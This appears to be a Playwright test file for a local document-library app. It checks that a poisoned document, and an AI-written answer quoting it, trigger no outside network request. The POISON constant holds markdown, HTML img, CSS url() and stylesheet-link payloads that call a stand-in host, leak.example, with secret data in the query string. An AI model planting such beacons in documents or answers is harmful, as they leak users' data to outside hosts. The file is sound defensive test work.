/**
 * A poisoned document never makes the browser fetch from outside.
 *
 * The Library shows document text as plain text, and an answer that quotes a
 * document goes through the chat sanitiser. A passage that contains a remote
 * image (markdown, HTML, CSS url()) must therefore produce no request to that
 * host, in the evidence list, in the Reader and in a written answer; the
 * evidence shows the characters, and the answer shows a placeholder.
 *
 * Read from a running scratch app, never the live one. The Library's own
 * endpoints are stubbed so no model runs, and every outside request is recorded
 * and answered with a pixel so a leak is visible rather than a timeout.
 *
 *   FRIDAY_URL=http://localhost:3217 PW_CHANNEL=msedge npx playwright test tests/library_no_remote_loads.spec.ts
 */
import { test, expect, type Page } from '@playwright/test';

const BASE = process.env.FRIDAY_URL || '';
if (process.env.PW_CHANNEL) test.use({ channel: process.env.PW_CHANNEL });
test.setTimeout(180000);
test.use({ viewport: { width: 1600, height: 1000 } });

const PIXEL = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64');

const POISON = [
  'Plain words first. ![x](https://leak.example/md?d=SECRET)',
  '<img src="https://leak.example/html?d=SECRET">',
  '<div style="background:url(https://leak.example/css?d=SECRET)">css</div>',
  '<link rel="stylesheet" href="https://leak.example/link.css">',
].join('\n');

const json = (body: unknown) => ({ status: 200, contentType: 'application/json', body: JSON.stringify(body) });

async function boot(page: Page, leaks: string[]) {
  await page.route(/^https?:\/\/(?!(localhost|127\.0\.0\.1|\[::1\]))/, async r => {
    leaks.push(r.request().url());
    await r.fulfill({ status: 200, contentType: 'image/png', body: PIXEL });
  });
  page.on('request', q => { if (/leak\.example/.test(q.url())) leaks.push('seen:' + q.url()); });
  await page.route('**/api/library/status', r => r.fulfill(json({
    status: 'ok', empty: false, counts: { indexed: 1, queued: 0, failed: 0, skipped: 0, total: 1 }, scopes: [{ id: 's1', name: 'Lib', documents: 1 }],
    failures: [], skipped: [], reading: 0, paused: false, waiting_because: null, vault: { documents: 0, unlocked: true },
    encoder: { available: true }, laya: { loaded: false }, kg_learn: 'off', index_encrypted: false })));
  await page.route('**/api/library/tree**', r => r.fulfill(json({ status: 'ok', nodes: [
    { id: 'f:1', kind: 'folder', title: 'Lib', parent: '', documents: 1 },
    { id: 'd:1', kind: 'document', title: 'Poisoned', ext: 'md', pages: null, shelf: 'open', parent: 'f:1' }], truncated: false, locked: 0 })));
  await page.route('**/api/library/document/1', r => r.fulfill(json({ status: 'ok', document: { id: 'd:1', title: 'Poisoned', ext: 'md', shelf: 'open', cloud_grant: false, cited_in: 0 } })));
  await page.route('**/api/library/search**', r => {
    const ev = { label: '1.1', doc: 'Poisoned', doc_id: 1, block_id: 7, page: null, para: 1, text: POISON, sure: 'sure', score: 0.9 };
    const body = 'data: ' + JSON.stringify({ event: 'evidence', evidence: [ev], searched: { fallback: 'none' }, notes: [] }) + '\n\n'
      + 'data: ' + JSON.stringify({ event: 'answer', text: 'It says: ' + POISON + ' [lib:1#7]' }) + '\n\n'
      + 'data: ' + JSON.stringify({ event: 'done', receipt: null }) + '\n\n';
    return r.fulfill({ status: 200, headers: { 'Content-Type': 'text/event-stream' }, body });
  });
  await page.route('**/api/library/block/7', r => r.fulfill(json({ status: 'ok', block: {
    id: 7, doc_id: 1, title: 'Poisoned', kind: 'para', page: null, pages: null, bbox: null, text: POISON, section: 'Notes',
    neighbours: [{ id: 7, kind: 'para', text: POISON, page: null, current: true }], page_image: false, doc_kind: 'markdown', para: 1 } })));
  await page.route('**/api/setup/status', r => r.fulfill(json({ initialized: true })));
  await page.route('**/api/work/forecast', r => r.fulfill(json({ will_pause: false })));
  await page.route('**/api/privacy/cloud-consent', r => r.request().method() === 'GET' ? r.fulfill(json({ needs_prompt: false })) : r.continue());
  await page.goto(BASE + '/');
  await page.waitForSelector('.dock', { timeout: 90000 });
  await page.waitForTimeout(1500);
}

test.skip(!BASE, 'set FRIDAY_URL to a scratch server');

test('evidence, the Reader and a written answer make no outside request', async ({ page }) => {
  const leaks: string[] = [];
  await boot(page, leaks);
  await page.evaluate(() => (window as any).fridayOpenWorkspace({ workspace: 'library', q: 'what does it say' }));
  await page.waitForSelector('.lb-root', { timeout: 30000 });
  await page.fill('.lb-ask input', 'what does it say');
  await page.click('.lb-ask button[type=submit]');
  await page.waitForSelector('.lb-card .quote', { timeout: 30000 });
  // The passage is characters, never an element the browser would load.
  expect(await page.locator('.lb-card .quote img, .lb-card .quote link, .lb-card .quote [style]').count()).toBe(0);
  await expect(page.locator('.lb-card .quote').first()).toContainText('leak.example');
  // The written answer goes through the chat sanitiser: a placeholder, not a request.
  expect(await page.locator('.lb-answer img').count()).toBe(0);
  await page.click('.lb-card .acts button:has-text("Open")');
  await page.waitForSelector('.lr-root', { timeout: 30000 });
  expect(await page.locator('.lr-root img, .lr-root link, .lr-root [style*="url("]').count()).toBe(0);
  await page.waitForTimeout(2000);
  expect(leaks, 'no request may leave the machine').toEqual([]);
});

test('a footnote chip to a dead source says so and opens nothing', async ({ page }) => {
  const leaks: string[] = [];
  await boot(page, leaks);
  await page.route('**/api/library/block/99', r => r.fulfill({ status: 404, contentType: 'application/json', body: '{"status":"denied"}' }));
  const html = await page.evaluate(() => (window as any).renderFridayMarkdown('A claim [lib:1#99].'));
  await page.evaluate((h: string) => {
    const d = document.createElement('div');
    d.id = 'chip-probe';
    d.innerHTML = h;
    document.body.appendChild(d);
  }, html);
  await expect(page.locator('#chip-probe .friday-cite')).toContainText('no longer in your Library', { timeout: 10000 });
  expect(await page.locator('#chip-probe .friday-cite[data-lib-block]').count()).toBe(0);
  expect(leaks).toEqual([]);
});
